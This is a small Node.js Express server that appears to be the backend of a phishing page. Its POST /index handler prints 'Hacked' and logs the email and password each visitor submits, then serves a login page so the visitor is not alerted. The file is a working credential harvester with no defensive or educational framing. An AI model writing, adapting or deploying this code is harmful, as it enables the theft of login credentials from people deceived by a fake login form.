const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const app = express();

app.use(bodyParser.urlencoded({extened: true}));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname , "/public")));

app.get("/", (req,res) => {
   res.sendFile(path.join(__dirname , "index.html"));
});

app.post("/index", (req,res) => {
  
  console.log("Hacked");
  console.log(req.body.email);
  console.log(req.body.password);
  
  res.sendFile(path.join(__dirname, "login.html"));
});

app.listen(2002,(err) => {
  if(err){
     console.log("Error: occure");
  } else {
    console.log("Runnning");
  }
});
